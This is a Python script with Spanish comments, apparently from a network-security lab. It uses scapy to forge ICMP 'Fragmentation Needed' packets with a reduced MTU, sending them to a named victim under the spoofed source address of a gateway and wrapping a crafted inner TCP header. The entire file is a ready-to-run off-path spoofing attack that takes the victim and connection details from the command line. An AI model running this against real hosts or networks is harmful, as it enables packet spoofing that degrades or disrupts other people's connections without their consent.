#!/usr/bin/env python3
"""Forja ICMP Type 3 Code 4 (Fragmentation Needed) con MTU reducido."""
import struct
import sys
from scapy.all import IP, ICMP, TCP, send


def forge_icmp_mtu(victim_ip, src_ip, dst_ip, sport, dport, seq, mtu=576, gateway_ip="10.9.0.1"):
    inner = IP(src=src_ip, dst=dst_ip) / TCP(sport=int(sport), dport=int(dport), seq=int(seq), flags="PA")
    # Suplantar puerta de enlace como emisor del ICMP (off-path)
    pkt = IP(src=gateway_ip, dst=victim_ip) / ICMP(type=3, code=4) / inner
    raw = bytearray(bytes(pkt))
    ip_hlen = (raw[0] & 0x0F) * 4
    icmp_off = ip_hlen
    struct.pack_into("!H", raw, icmp_off + 6, int(mtu))
    send(IP(raw), verbose=False)
    print(f"[+] ICMP Type3/Code4 forjado hacia {victim_ip} (MTU={mtu})")
    print(f"    Datagrama interno: {src_ip}:{sport} -> {dst_ip}:{dport} seq={seq}")


if __name__ == "__main__":
    if len(sys.argv) < 7:
        print("Uso: python3 forge_icmp_mtu.py <victima> <src_ip> <dst_ip> <sport> <dport> <seq> [mtu]")
        sys.exit(1)
    mtu = int(sys.argv[7]) if len(sys.argv) > 7 else 576
    forge_icmp_mtu(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6], mtu)
